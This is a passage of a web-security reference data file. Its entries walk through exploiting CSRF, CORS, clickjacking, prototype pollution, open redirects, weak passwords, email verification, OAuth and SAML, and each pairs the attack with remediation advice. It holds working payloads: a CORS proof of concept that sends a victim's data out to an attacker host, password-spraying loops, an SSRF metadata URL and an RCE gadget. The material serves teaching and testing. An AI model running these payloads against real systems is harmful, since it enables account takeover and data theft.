              { label: "1. Find a state-changing request with weak protection", cmd: "# capture a sensitive action (change email/password, transfer, role change)\nPOST /account/change-email  email=user@corp\n# is it authorised by the session cookie alone, with no unguessable token?" },
              { label: "2. Test whether the anti-CSRF control actually holds", cmd: "# remove the token entirely           -> still works?  vulnerable\n# use a token from another session     -> accepted?     not session-bound\n# change POST to GET                    -> honoured?     method not enforced\n# empty the token value                -> accepted?     validated only for presence" },
              { label: "3. Build the forged request as an auto-submitting form", cmd: "<html><body>\n <form action=\"https://target/account/change-email\" method=\"POST\">\n   <input type=\"hidden\" name=\"email\" value=\"attacker@evil.com\">\n </form>\n <script>document.forms[0].submit()</script>\n</body></html>" },
              { label: "4. GET-based actions are even simpler", cmd: "# if a GET changes state, an <img> tag alone fires it on page load:\n<img src=\"https://target/account/delete?confirm=true\">" },
              { label: "5. Deliver and chain", cmd: "# host the page and lure the authenticated victim to it\n# chain: CSRF the email to one you control -> trigger password reset -> account takeover" }
            ]
          },
          {
            title: "Common Bypasses to Test",
            type: "table",
            columns: ["Weak defence", "Bypass"],
            rows: [
              ["Token not validated", "Remove it entirely and see if the request still works"],
              ["Token not tied to session", "Use a token from another account"],
              ["Token only on POST", "Try the same action as GET"],
              ["Method check only", "Override with X-HTTP-Method-Override or a different verb"],
              ["Referer check", "Suppress the Referer (meta referrer) or match a lax substring check"]
            ]
          },
          {
            title: "Attack Chain",
            type: "table",
            columns: ["Step", "Action", "Result"],
            rows: [
              ["1", "Find a cookie-authorised state change", "Candidate CSRF target"],
              ["2", "Confirm the token is missing/weak", "Forgeable request"],
              ["3", "Host an auto-submitting page", "Request fires from victim's session"],
              ["4", "Change email/password, then reset", "Account takeover"]
            ]
          },
          {
            title: "Tools Used",
            type: "table",
            columns: ["Tool", "Purpose"],
            rows: [
              ["Burp Suite", "Generate CSRF PoCs, test token validation logic"],
              ["Browser + custom HTML", "Host and deliver the forged request"],
              ["XSStrike / manual", "Chain with XSS to defeat token protection"]
            ]
          },
          {
            title: "References",
            type: "references",
            items: [
              { label: "PortSwigger — CSRF", url: "https://portswigger.net/web-security/csrf" },
              { label: "OWASP — CSRF Prevention Cheat Sheet", url: "https://cheatsheetseries.owasp.org/cheatsheets/Cross-Site_Request_Forgery_Prevention_Cheat_Sheet.html" }
            ]
          },
          {
            title: "Remediation",
            type: "notes",
            items: [
              "Use anti-CSRF tokens: unpredictable, per-session (or per-request), validated server-side, and bound to the user's session.",
              "Set SameSite=Lax (or Strict) on session cookies — it blocks most cross-site request delivery by default in modern browsers.",
              "For sensitive actions, re-authenticate or require a second factor.",
              "Prefer framework-provided CSRF protection over hand-rolled checks; Referer/Origin checks are a weaker fallback.",
              "Do not rely on custom request headers alone unless you also enforce CORS correctly."
            ]
          }
        ]
      },
      {
        id: "cors-misconfig",
        name: "CORS Misconfiguration",
        severity: "Medium",
        ref: "https://portswigger.net/web-security/cors",
        description: "An over-permissive cross-origin policy lets a malicious site read authenticated responses from the target.",
        brief: "CORS controls which origins may read responses from a cross-origin request. Misconfigured, it hands that permission to attackers — most commonly by reflecting the request's Origin header into Access-Control-Allow-Origin while also allowing credentials, which lets any site make authenticated requests and read the responses.\n\nImpact: theft of session-bound data, tokens, and PII directly from authenticated API responses. Unlike CSRF (which can send but not read), a CORS misconfiguration leaks the response body to an attacker-controlled page.",
        quickReference: [
          { label: "The dangerous combo", cmd: "Access-Control-Allow-Origin: <reflected origin>\nAccess-Control-Allow-Credentials: true" },
          { label: "Test: reflected origin", cmd: "Send  Origin: https://evil.com  — is it echoed back in ACAO?" },
          { label: "Test: null origin", cmd: "Origin: null  — accepted? Reachable from a sandboxed iframe" },
          { label: "Weak regex", cmd: "Origin: https://target.com.evil.com  or  https://eviltarget.com — does a substring match pass?" }
        ],
        sections: [
          {
            title: "How It's Exploited",
            type: "commands",
            commands: [
              { label: "1. Send a rogue Origin and read the response headers", cmd: "curl -s -I 'https://target/api/account' -H 'Origin: https://evil.com' -b 'session=<cookie>'\n# vulnerable if the response reflects it:\n#   Access-Control-Allow-Origin: https://evil.com\n#   Access-Control-Allow-Credentials: true" },
              { label: "2. Probe weak allow-list logic", cmd: "# try each and inspect ACAO:\nOrigin: null                          # accepted? -> sandboxed iframe delivery\nOrigin: https://target.com.evil.com   # suffix trick passes a naive endsWith\nOrigin: https://eviltarget.com        # prefix/substring match\nOrigin: https://sub.target.com        # all-subdomains trust + one subdomain XSS" },
              { label: "3. Build a PoC that reads authenticated data", cmd: "<script>\n fetch('https://target/api/account', {credentials:'include'})\n   .then(r => r.text())\n   .then(d => fetch('https://attacker/collect?d=' + encodeURIComponent(d)));\n</script>\n# victim visits -> their private API response is exfiltrated to you" },
              { label: "4. null-origin variant via a sandboxed iframe", cmd: "<iframe sandbox=\"allow-scripts\" srcdoc=\"<script>\n fetch('https://target/api/account',{credentials:'include'})\n   .then(r=>r.text()).then(d=>location='https://attacker/?d='+btoa(d));\n</script>\"></iframe>   # forces Origin: null" },
              { label: "5. Escalate with the leaked material", cmd: "# read a CSRF token / API key from the response, then perform actions as the victim\n# or use leaked session data for further account compromise" }
            ]
          },
          {
            title: "Misconfiguration Patterns",
            type: "table",
            columns: ["Pattern", "Risk"],
            rows: [
              ["Reflect Origin + credentials", "Any origin can read authenticated responses — the classic critical case"],
              ["ACAO: null + credentials", "Reachable via sandboxed iframes / data: URLs"],
              ["Wildcard with credentials", "Browsers block ACAO:* with credentials, but broken proxies sometimes allow it"],
              ["Weak origin allow-list", "Substring/suffix checks let target.com.evil.com or eviltarget.com through"],
              ["Trusting all subdomains", "One XSS on any subdomain then reads everything cross-origin"]
            ]
          },
          {
            title: "Attack Chain",
            type: "table",
            columns: ["Step", "Action", "Result"],
            rows: [
              ["1", "Send Origin: evil.com, inspect ACAO/ACAC", "Confirm reflected origin + credentials"],
              ["2", "Host a fetch() PoC with credentials", "Cross-origin read of private data"],
              ["3", "Lure the authenticated victim", "Response body exfiltrated"],
              ["4", "Reuse leaked token/key", "Actions as the victim"]
            ]
          },
          {
            title: "Tools Used",
            type: "table",
            columns: ["Tool", "Purpose"],
            rows: [
              ["Burp Suite (CORS* checks)", "Detect reflected-origin and credentials misconfig"],
              ["curl", "Quick header probing with a forged Origin"],
              ["CORScanner / Corsy", "Automated CORS misconfiguration scanning"]
            ]
          },
          {
            title: "References",
            type: "references",
            items: [
              { label: "PortSwigger — CORS", url: "https://portswigger.net/web-security/cors" },
              { label: "PortSwigger — Exploiting CORS misconfigurations", url: "https://portswigger.net/research/exploiting-cors-misconfigurations-for-bitcoins-and-bounties" }
            ]
          },
          {
            title: "Remediation",
            type: "notes",
            items: [
              "Never reflect the Origin header blindly; validate it against a strict server-side allow-list of exact origins.",
              "Only send Access-Control-Allow-Credentials: true when genuinely required, and never together with a wildcard or reflected origin.",
              "Avoid trusting null and avoid loose regex matching — anchor and fully match the origin.",
              "Keep sensitive data out of endpoints that are CORS-enabled where possible.",
              "Do not treat CORS as an access-control mechanism; it governs read access from browsers, not authorization."
            ]
          }
        ]
      },
      {
        id: "clickjacking",
        name: "Clickjacking",
        severity: "Medium",
        ref: "https://portswigger.net/web-security/clickjacking",
        description: "The target page is framed invisibly so the victim's clicks land on it, triggering unintended actions.",
        brief: "Clickjacking (UI redress) loads the target site in a transparent or disguised iframe over attacker-controlled content, so the victim thinks they are interacting with the attacker's page while their clicks actually hit the framed target. Combined with the victim's active session, this drives state-changing actions.\n\nImpact: unintended actions performed as the victim — enabling a setting, confirming a payment, granting an OAuth scope. The defence is to refuse to be framed by untrusted origins, via frame-ancestors CSP or the legacy X-Frame-Options header.",
        quickReference: [
          { label: "Test: can the page be framed?", cmd: "<iframe src=\"https://target.com/sensitive\"></iframe>  — does it render?" },
          { label: "Missing protections", cmd: "No  X-Frame-Options  and no  Content-Security-Policy: frame-ancestors" },
          { label: "Overlay concept", cmd: "Position a transparent iframe (opacity:0) above a decoy button" },
          { label: "Variant", cmd: "Drag-and-drop / cursor-jacking for multi-step actions" }
        ],
        sections: [
          {
            title: "How It's Exploited",
            type: "commands",
            commands: [
              { label: "1. Check the anti-framing headers", cmd: "curl -s -I 'https://target/account/settings' | grep -iE 'x-frame-options|content-security-policy'\n# no X-Frame-Options AND no frame-ancestors in CSP -> framable" },
              { label: "2. Confirm it renders inside an iframe", cmd: "<iframe src=\"https://target/account/settings\" width=800 height=600></iframe>\n# if the real page loads (rather than being blocked), clickjacking is possible" },
              { label: "3. Overlay a decoy over the sensitive control", cmd: "<style>\n iframe{position:absolute;top:0;left:0;width:800px;height:600px;opacity:0.0;z-index:2}\n .decoy{position:absolute;top:410px;left:300px;z-index:1}\n</style>\n<div class=\"decoy\"><button>Claim your free prize</button></div>\n<iframe src=\"https://target/account/enable-2fa-off\"></iframe>\n# align the invisible real button under the visible decoy" },
              { label: "4. Multi-step variants", cmd: "# drag-and-drop 'cursorjacking' to fill fields, or chain frames\n# to walk a victim through a multi-click flow (e.g. OAuth consent)" },
              { label: "5. Defeat weak JS frame-busting", cmd: "# if the page uses JS to break out of frames, neutralise it:\n<iframe sandbox=\"allow-forms allow-scripts\" src=\"https://target/...\"></iframe>\n# sandbox without allow-top-navigation blocks the frame-buster" }
            ]
          },
          {
            title: "Finding It",
            type: "table",
            columns: ["Check", "Detail"],
            rows: [
              ["Response headers", "Absence of X-Frame-Options and frame-ancestors in CSP"],
              ["Framing test", "Load the page in an iframe from another origin — if it renders, it is framable"],
              ["Sensitive actions", "Identify one-click state changes worth hijacking"],
              ["Frame-buster quality", "Weak JS frame-busting can be defeated with the sandbox attribute"]
            ]
          },
          {
            title: "Attack Chain",
            type: "table",
            columns: ["Step", "Action", "Result"],
            rows: [
              ["1", "Confirm missing frame protections", "Page is framable"],
              ["2", "Overlay a decoy over a real control", "Clicks routed to the target"],
              ["3", "Lure the authenticated victim to click", "State change fires in their session"],
              ["4", "Chain to a larger weakness", "Escalated impact"]
            ]
          },
          {
            title: "Tools Used",
            type: "table",
            columns: ["Tool", "Purpose"],
            rows: [
              ["Burp Suite (Clickbandit)", "Auto-generate a clickjacking PoC page"],
              ["curl", "Header inspection for missing anti-framing controls"],
              ["Browser + HTML/CSS", "Build and align the overlay proof"]
            ]
          },
          {
            title: "References",
            type: "references",
            items: [
              { label: "PortSwigger — Clickjacking", url: "https://portswigger.net/web-security/clickjacking" },
              { label: "OWASP — Clickjacking Defense Cheat Sheet", url: "https://cheatsheetseries.owasp.org/cheatsheets/Clickjacking_Defense_Cheat_Sheet.html" }
            ]
          },
          {
            title: "Remediation",
            type: "notes",
            items: [
              "Set Content-Security-Policy: frame-ancestors 'self' (or an explicit allow-list) — the modern, robust control.",
              "Also set X-Frame-Options: DENY or SAMEORIGIN for older browsers.",
              "Do not rely on JavaScript frame-busting; it is bypassable with the iframe sandbox attribute.",
              "Require an explicit, hard-to-hijack confirmation for the most sensitive actions.",
              "Test the headers on every sensitive page, not just the site root."
            ]
          }
        ]
      },
      {
        id: "prototype-pollution",
        name: "Prototype Pollution",
        severity: "High",
        ref: "https://portswigger.net/web-security/prototype-pollution",
        description: "Injecting into Object.prototype in JavaScript, corrupting application behaviour up to XSS or RCE.",
        brief: "Prototype pollution is a JavaScript-specific flaw where an attacker sets properties on Object.prototype via keys like __proto__ or constructor.prototype. Because nearly every object inherits from that prototype, a polluted property silently appears on objects across the application, changing logic that was never meant to be attacker-influenced.\n\nImpact: DOM XSS on the client, and on Node.js servers config corruption, security-flag bypass, denial of service, and — with the right gadget — command execution. It hides in recursive merges, object-path setters, and query-string parsers.",
        quickReference: [
          { label: "Client-side probe", cmd: "?__proto__[test]=polluted   then check  Object.prototype.test  in console" },
          { label: "JSON payload", cmd: "{\"__proto__\": {\"isAdmin\": true}}" },
          { label: "Constructor path", cmd: "constructor[prototype][test]=polluted" },
          { label: "Gadget hunt", cmd: "Find a property the app reads but never sets — pollute it to change behaviour" }
        ],
        sections: [
          {
            title: "How It's Exploited",
            type: "commands",
            commands: [
              { label: "1. Pollute a test property and confirm inheritance", cmd: "# client-side, via the query string:\n?__proto__[claudetest]=polluted\n# then in the browser console:\nObject.prototype.claudetest   // 'polluted' -> vulnerable\n# server-side, via a JSON body to a merge endpoint:\n{\"__proto__\":{\"claudetest\":\"polluted\"}}" },
              { label: "2. Try each pollution vector", cmd: "?__proto__[x]=y                 # bracket in query string\nconstructor[prototype][x]=y      # constructor path (when __proto__ is filtered)\n{\"__proto__\":{\"x\":\"y\"}}          # JSON key\n# any recursive merge / object-path set of user data is a candidate" },
              { label: "3. Find a gadget — a property the code reads but never sets", cmd: "# search client scripts / server code for undefined-property reads:\n#   options.transport_url, config.shell, sanitizer.ALLOWED_ATTR, isAdmin\n# whichever the app trusts becomes the exploit primitive" },
              { label: "4. Client gadget -> DOM XSS", cmd: "# many sanitisers/templates read config from an object you can pollute:\n?__proto__[hitCallback]=alert(document.domain)     # analytics gadget\n?__proto__[srcdoc][0]=<img/src/onerror=alert(1)>   # template gadget -> XSS" },
              { label: "5. Server gadget -> RCE (Node)", cmd: "# pollute options later passed to child_process:\n{\"__proto__\":{\"shell\":\"/proc/self/exe\",\"argv0\":\"node\",\"NODE_OPTIONS\":\"--require /proc/self/environ\"}}\n# or env/argv gadgets documented per-library -> command execution" }
            ]
          },
          {
            title: "Vulnerable Sinks",
            type: "table",
            columns: ["Pattern", "Risk"],
            rows: [
              ["Recursive merge/extend", "merge(target, userInput) that copies __proto__ into the prototype"],
              ["Object path setters", "lodash.set / setValue with an attacker-controlled path"],
              ["Query/JSON parsers", "Parsers that build nested objects from __proto__ keys"],
              ["Deep clone", "Naive clones that carry the polluted property forward"]
            ]
          },
          {
            title: "Attack Chain",
            type: "table",
            columns: ["Step", "Action", "Result"],
            rows: [
              ["1", "Pollute a test property", "Confirm prototype pollution"],
              ["2", "Find a gadget the app reads", "A concrete exploit path"],
              ["3", "Pollute the gadget property", "DOM XSS / flag bypass / RCE"],
              ["4", "Escalate via the gadget's effect", "Client or server compromise"]
            ]
          },
          {
            title: "Tools Used",
            type: "table",
            columns: ["Tool", "Purpose"],
            rows: [
              ["Burp Suite (DOM Invader)", "Automated client-side prototype-pollution + gadget discovery"],
              ["ppmap / silentspring", "Scan for pollution sources and known gadgets"],
              ["Node.js REPL", "Validate server-side gadgets locally"]
            ]
          },
          {
            title: "References",
            type: "references",
            items: [
              { label: "PortSwigger — Prototype pollution", url: "https://portswigger.net/web-security/prototype-pollution" },
              { label: "PayloadsAllTheThings — Prototype Pollution", url: "https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Prototype%20Pollution" }
            ]
          },
          {
            title: "Remediation",
            type: "notes",
            items: [
              "Reject or strip __proto__, constructor, and prototype keys in user-supplied objects before merging.",
              "Use Object.create(null) for map-like objects, or a Map, so there is no prototype to pollute.",
              "Use Object.freeze(Object.prototype) as a hardening measure where feasible.",
              "Prefer libraries patched against prototype pollution and keep them updated (many merge/set utilities have advisories).",
              "Validate input structure with a strict schema rather than deep-merging arbitrary objects."
            ]
          }
        ]
      },
      {
        id: "open-redirect",
        name: "Open Redirect",
        severity: "Low",
        ref: "https://cwe.mitre.org/data/definitions/601.html",
        description: "A redirect target taken from user input sends victims to attacker sites, aiding phishing and token theft.",
        brief: "An open redirect exists when an application redirects to a URL taken from user-controllable input without validating it. On its own it is low severity — but it lends a trusted domain to phishing links, and becomes serious when chained: leaking OAuth tokens or authorization codes via a loose redirect_uri, or bouncing through to SSRF or XSS.\n\nImpact: credible phishing under a trusted domain, and OAuth token/code theft when chained. The fix is to never redirect to a raw user-supplied absolute URL; use an allow-list or relative paths only.",
        quickReference: [
          { label: "Basic test", cmd: "?next=https://evil.com   ?url=//evil.com   ?redirect=https:evil.com" },
          { label: "Filter bypasses", cmd: "//evil.com   https:/\\evil.com   https://target.com@evil.com   /\\/evil.com" },
          { label: "OAuth token theft angle", cmd: "redirect_uri=https://evil.com  — leaks code/token if not strictly matched" },
          { label: "Where to look", cmd: "Login/logout next=, return_to, callback, url, dest parameters" }
        ],
        sections: [
          {
            title: "How It's Exploited",
            type: "commands",
            commands: [
              { label: "1. Find redirect parameters and test the raw case", cmd: "# common names: next, url, return, returnTo, redirect, dest, callback, continue\nhttps://target/login?next=https://evil.com\n# follow the response: a 3xx Location: https://evil.com = open redirect" },
              { label: "2. Defeat naive filters", cmd: "//evil.com                      # protocol-relative (no scheme to block)\nhttps:/\\evil.com                # backslash confuses parsers\nhttps://target.com@evil.com      # everything before @ is userinfo -> lands on evil.com\nhttps://target.com.evil.com      # suffix trick vs endsWith('target.com')\n/%2f/evil.com   /\\/evil.com      # encoded / mixed slashes normalise oddly" },
              { label: "3. Weaponise for phishing", cmd: "# a link on the trusted domain that silently lands on your page:\nhttps://target.com/login?next=https://evil-login.com\n# victims trust the visible target.com host" },
              { label: "4. Chain to OAuth token/code theft", cmd: "# if redirect_uri isn't exact-matched, point it at your host:\nhttps://target/oauth/authorize?client_id=..&redirect_uri=https://evil.com&response_type=token\n# the access token / auth code is delivered to evil.com" },
              { label: "5. Chain to XSS / SSRF where the scheme is honoured", cmd: "?next=javascript:alert(document.domain)   # if used in a sink -> XSS\n?url=http://169.254.169.254/latest/meta-data/   # server-side follow -> SSRF" }
            ]
          },
          {
            title: "Common Bypasses",
            type: "table",
            columns: ["Filter", "Bypass"],
            rows: [
              ["Blocks http/https", "Protocol-relative //evil.com"],
              ["Requires leading /", "/\\evil.com or /%2f/evil.com — browsers normalise oddly"],
              ["Allow-list by substring", "https://target.com.evil.com or https://evil.com/target.com"],
              ["Uses @ parsing", "https://target.com@evil.com (everything before @ is userinfo)"],
              ["Backslash quirks", "https:/\\/\\evil.com and mixed slashes"]
            ]
          },
          {
            title: "Attack Chain",
            type: "table",
            columns: ["Step", "Action", "Result"],
            rows: [
              ["1", "Find a user-controlled redirect param", "Candidate open redirect"],
              ["2", "Bypass any weak validation", "Redirect to attacker host confirmed"],
              ["3", "Phish under the trusted domain", "Credential capture"],
              ["4", "Or abuse a loose redirect_uri", "OAuth token / code theft"]
            ]
          },
          {
            title: "Tools Used",
            type: "table",
            columns: ["Tool", "Purpose"],
            rows: [
              ["Burp Suite", "Test redirect params and filter bypasses"],
              ["OpenRedireX", "Automated open-redirect fuzzing with payload lists"],
              ["gau / waybackurls", "Harvest URLs with redirect parameters to test"]
            ]
          },
          {
            title: "References",
            type: "references",
            items: [
              { label: "CWE-601 — Open Redirect", url: "https://cwe.mitre.org/data/definitions/601.html" },
              { label: "OWASP — Unvalidated Redirects and Forwards Cheat Sheet", url: "https://cheatsheetseries.owasp.org/cheatsheets/Unvalidated_Redirects_and_Forwards_Cheat_Sheet.html" }
            ]
          },
          {
            title: "Remediation",
            type: "notes",
            items: [
              "Do not redirect to user-supplied absolute URLs. Prefer relative paths, or map an input key to a server-side allow-list of destinations.",
              "If external redirects are required, validate against a strict allow-list of exact hosts and reject everything else.",
              "For OAuth, require exact redirect_uri matching — no wildcards, no prefix matching.",
              "Show an interstitial 'you are leaving this site' page for any off-site redirect.",
              "Normalise and parse the URL with a robust library before validating; do not use naive string checks."
            ]
          }
        ]
      }
    ]
  },
    {
    category: "Access Control & Authentication",
    vulns: [
      {
        "id": "weak-password-policy",
        "name": "Weak Password Policy",
        "severity": "Medium",
        "ref": "https://owasp.org/www-community/vulnerabilities/Weak_password_requirements",
        "description": "The application accepts weak, common, or predictable passwords, making accounts easy to guess or brute-force.",
        "brief": "A password policy is the set of rules an application enforces on the passwords users choose. It is weak when it permits short passwords, common passwords (password, 123456, the username itself), or has no defence against automated guessing. The problem is compounded when the rules are only enforced in the browser and never re-checked on the server.\n\nImpact: weak policies turn a leaked username list into compromised accounts through credential stuffing, password spraying, and simple online guessing — the single most common cause of account takeover.",
        "quickReference": [
          { "label": "Try obviously weak passwords", "cmd": "password, 123456, qwerty12, <username>, <company>123, Password1!" },
          { "label": "Check where the rule is enforced", "cmd": "# strip client-side JS validation, submit a 1-char password directly to the API" },
          { "label": "Spray one password across many users", "cmd": "for u in $(cat users.txt); do curl -s -d \"user=$u&pass=Winter2024!\" https://target/login; done" }
        ],
        "sections": [
          { "title": "How It's Tested", "type": "commands", "commands": [
            { "label": "1. Probe the accepted complexity server-side", "cmd": "# bypass the browser and post directly to the registration/change-password API\ncurl -s -X POST https://target/register -d 'email=t@t.com&password=a'\n# accepted 1-char password = no server-side policy" },
            { "label": "2. Try known-weak and context passwords", "cmd": "# common list + words from the site (company name, product, season+year)\npassword, 123456, 111111, abcabc, qwerty12, <username>, <company>2024" },
            { "label": "3. Password spraying (one password, many users)", "cmd": "# slow and wide beats fast and narrow — avoids per-account lockout\nnetexec http target -u users.txt -p 'Spring2024!' --continue-on-success\n# web: replay the login request in Burp Intruder across the username list" }
          ]},
          { "title": "What a Weak Policy Allows", "type": "table", "columns": ["Weakness", "Consequence"], "rows": [
            ["No minimum length / very short", "Fast offline and online brute force"],
            ["No common-password blocklist", "Credential stuffing and spraying succeed"],
            ["username == password permitted", "Trivial mass compromise"],
            ["No rate limit or lockout", "Unlimited online guessing"],
            ["Client-side-only enforcement", "Policy bypassed by posting to the API directly"]
          ]},
          { "title": "References", "type": "references", "items": [
            { "label": "OWASP — Weak Password Requirements", "url": "https://owasp.org/www-community/vulnerabilities/Weak_password_requirements" },
            { "label": "NIST SP 800-63B — Authenticator (password) guidance", "url": "https://pages.nist.gov/800-63-3/sp800-63b.html" }
          ]},
          { "title": "Remediation", "type": "notes", "items": [
            "Enforce a minimum length (12+ characters) and check candidates against a breached-password blocklist (e.g. Have I Been Pwned Pwned Passwords).",
            "Always validate the policy server-side; client-side checks are a UX aid only.",
            "Rate-limit and lock out (or step up with CAPTCHA/MFA) after repeated failures, per account and per source.",
            "Prefer length and passphrases over arbitrary composition rules, and encourage a password manager.",
            "Layer multi-factor authentication so a guessed password alone is not enough."
          ]}
        ]
      },
      {
        "id": "email-verification",
        "name": "Insufficient Email Verification",
        "severity": "Medium",
        "ref": "https://cwe.mitre.org/data/definitions/287.html",
        "description": "The application trusts an email address before it is proven to belong to the user, enabling account takeover and abuse.",
        "brief": "Many flows assume the person registering, or changing their address, actually controls that mailbox. When verification is missing, skippable, or bypassable, an attacker can bind an account to a victim's address, use an unverified account for privileged actions, or pre-register a victim's email so a later legitimate signup merges into the attacker's account (pre-account-takeover).\n\nImpact: account takeover, spoofed identity, spam and abuse from unverified accounts, and privilege inheritance where an email domain grants trust (e.g. @company.com auto-joins an internal tenant).",
        "quickReference": [
          { "label": "Is the account usable before verifying?", "cmd": "# register, DON'T click the link, then try to log in / act" },
          { "label": "Null-byte / encoding trick", "cmd": "victim@target.com%00@attacker.com   (validation reads one part, delivery another)" },
          { "label": "Pre-account-takeover", "cmd": "# register victim@corp.com first; wait for them to sign in via SSO -> merges into your account" },
          { "label": "Change-email without re-verify", "cmd": "# change address; is the new one trusted before the confirmation link is clicked?" }
        ],
        "sections": [
          { "title": "How It's Exploited", "type": "commands", "commands": [
            { "label": "1. Skip verification entirely", "cmd": "# create the account, never confirm, then exercise authenticated features\n# if it works, verification is decorative" },
            { "label": "2. Smuggle a second address past validation", "cmd": "# the validator checks the first token, the mailer sends to the second:\nvictim@target.com%00@attacker.com\nvictim@target.com%0a@attacker.com\n\"victim@target.com\"@attacker.com" },
            { "label": "3. Pre-account-takeover via SSO merge", "cmd": "# 1) attacker registers a local account with victim@corp.com (no verify enforced)\n# 2) victim later 'Sign in with Google' using the same address\n# 3) app merges the identities -> attacker keeps their known password" },
            { "label": "4. Trust an unverified corporate domain", "cmd": "# register bob@target.com — does it auto-join the target's internal workspace/tenant?" }
          ]},
          { "title": "Where It Bites", "type": "table", "columns": ["Scenario", "Impact"], "rows": [
            ["Account usable pre-verification", "Spam/abuse accounts, bypassed onboarding controls"],
            ["Email bound to a victim address", "Password reset then flows to the account = takeover"],
            ["Pre-account-takeover + SSO merge", "Persistent access after the victim joins"],
            ["Domain-based auto-trust", "Unauthorised access to internal tenants/roles"]
          ]},
          { "title": "References", "type": "references", "items": [
            { "label": "PortSwigger — Authentication vulnerabilities", "url": "https://portswigger.net/web-security/authentication" },
            { "label": "Microsoft/Okta — pre-account-takeover research", "url": "https://portswigger.net/daily-swig/account-takeover" }
          ]},
          { "title": "Remediation", "type": "notes", "items": [
            "Require a verified email before the account can perform any meaningful or privileged action.",
            "Re-verify on every email change, and do not trust the new address until the confirmation link is used.",
            "Normalise and strictly parse addresses (reject null bytes, CRLF, multiple @, and quoted local parts) before storing or mailing.",
            "When linking social/SSO identities, match on a verified email only, and never silently merge a local account into an SSO login.",
            "Do not grant trust or tenant membership from an email domain without an out-of-band check."
          ]}
        ]
      },
      {
        "id": "oauth-misconfig",
        "name": "OAuth Misconfiguration",
        "severity": "High",
        "ref": "https://portswigger.net/web-security/oauth",
        "description": "Flaws in an OAuth 2.0 / OIDC implementation — loose redirect URIs, missing state, or weak token handling — lead to account takeover.",
        "brief": "OAuth 2.0 delegates authentication/authorisation to a provider (Google, Facebook, an internal IdP). The security of the flow rests on a few checks: an exact-match redirect_uri, an unguessable and validated state parameter, and correct validation of the code/token and its audience. When any of these is loose, an attacker can steal authorization codes or tokens, or graft their identity onto a victim's session.\n\nImpact: full account takeover, login CSRF, and cross-account access — often without the victim entering any credentials on the attacker's site.",
        "quickReference": [
          { "label": "redirect_uri open/loose", "cmd": "redirect_uri=https://target.com.evil.com  or  //evil.com  or  /path/../evil — does it still send the code?" },
          { "label": "Missing / unvalidated state", "cmd": "# drop or fix the state param -> login CSRF (attach attacker's code to victim session)" },
          { "label": "Code/token leak via Referer", "cmd": "# ?code=... in the URL leaking to third-party scripts on the callback page" },
          { "label": "Implicit-flow token in fragment", "cmd": "#access_token=... in the URL fragment on a page you can influence" }
        ],
        "sections": [
          { "title": "How It's Exploited", "type": "commands", "commands": [
            { "label": "1. Hijack the code via a loose redirect_uri", "cmd": "# if the provider allows anything but an exact match, point it at your host:\nhttps://provider/authorize?client_id=X&redirect_uri=https://target.evil.com/cb&response_type=code&scope=...\n# the victim's authorization code is delivered to evil.com -> exchange it for their session" },
            { "label": "2. Login CSRF via missing state", "cmd": "# obtain YOUR code, then force the victim's browser to the callback with it:\nhttps://target/oauth/callback?code=<attacker_code>\n# victim is now logged into the attacker's account and adds data/cards to it" },
            { "label": "3. Steal the token from the URL", "cmd": "# implicit flow puts #access_token in the fragment; an open redirect or XSS on\n# the callback path, or a leaky Referer, exfiltrates it" },
            { "label": "4. Account linking without email verification", "cmd": "# link 'Sign in with Google' to an existing account by unverified email -> takeover" }
          ]},
          { "title": "Key Checks", "type": "table", "columns": ["Control", "What to verify"], "rows": [
            ["redirect_uri", "Exact string match against a registered allow-list; no wildcards, path tricks, or subdomains"],
            ["state", "Present, unguessable, bound to the session, and validated on return"],
            ["nonce (OIDC)", "Present and checked to bind the ID token to the request"],
            ["Authorization code", "Single-use, short-lived, exchanged over the back channel (PKCE for public clients)"],
            ["Token audience/issuer", "aud and iss validated so a token for another client can't be replayed"],
            ["Account linking", "Only on a verified email; never silently merge identities"]
          ]},
          { "title": "References", "type": "references", "items": [
            { "label": "PortSwigger — OAuth 2.0 authentication vulnerabilities", "url": "https://portswigger.net/web-security/oauth" },
            { "label": "OAuth 2.0 Security Best Current Practice (RFC 9700)", "url": "https://datatracker.ietf.org/doc/html/rfc9700" }
          ]},
          { "title": "Remediation", "type": "notes", "items": [
            "Register and enforce exact redirect_uri values — no wildcards, no partial matches.",
            "Always generate, bind, and validate a random state parameter (and nonce for OIDC).",
            "Use the authorization-code flow with PKCE; avoid the implicit flow entirely.",
            "Validate the token's signature, issuer, audience, and expiry before trusting it.",
            "Link social identities only on a verified email, and require explicit user confirmation."
          ]}
        ]
      },
      {
        "id": "saml-flaws",
        "name": "SAML Authentication Flaws",
        "severity": "High",
        "ref": "https://portswigger.net/web-security/saml",
        "description": "Weak validation of SAML assertions — especially signature handling — lets an attacker forge authentication as any user.",
        "brief": "SAML carries a signed XML assertion from an Identity Provider to a Service Provider stating who the user is. The whole trust model depends on the SP correctly validating that signature and the assertion's contents. Because XML signing is subtle, SPs frequently mis-validate — accepting unsigned assertions, allowing XML Signature Wrapping (XSW), or trusting attacker-controlled fields — which lets an attacker rewrite the NameID and log in as anyone, including administrators.\n\nImpact: complete authentication bypass and privilege escalation across every application behind the SSO.",
        "quickReference": [
          { "label": "Decode the SAMLResponse", "cmd": "echo '<b64>' | base64 -d | xmllint --format -   # (URL-decode first if needed)" },
          { "label": "Change the identity", "cmd": "edit  <NameID>admin@target.com</NameID>  and resend — accepted without a valid signature?" },
          { "label": "Signature stripping", "cmd": "remove the <Signature> element entirely — does the SP still accept it?" },
          { "label": "XML Signature Wrapping (XSW)", "cmd": "keep the signed assertion but add a second, unsigned, attacker-controlled one" }
        ],
        "sections": [
          { "title": "How It's Exploited", "type": "commands", "commands": [
            { "label": "1. Capture and decode the response", "cmd": "# intercept the POST to the SP's ACS endpoint, grab SAMLResponse, then:\necho '<SAMLResponse b64>' | base64 -d | xmllint --format -" },
            { "label": "2. Tamper the assertion", "cmd": "# change the asserted identity and replay:\n<saml:NameID>administrator@target.com</saml:NameID>\n# base64/deflate + re-encode and send — accepted = broken validation" },
            { "label": "3. Signature exclusion / stripping", "cmd": "# delete the <ds:Signature> node; a SP that only validates 'if a signature is present'\n# will accept the now-unsigned, attacker-modified assertion" },
            { "label": "4. XML Signature Wrapping", "cmd": "# use the SAML Raider Burp extension: keep the original signed assertion so the\n# signature verifies, but inject a second assertion the SP actually reads" }
          ]},
          { "title": "Common Weaknesses", "type": "table", "columns": ["Flaw", "Effect"], "rows": [
            ["Assertion accepted without a signature", "Forge any identity outright"],
            ["Signature not tied to the read element (XSW)", "Inject an unsigned assertion beside the signed one"],
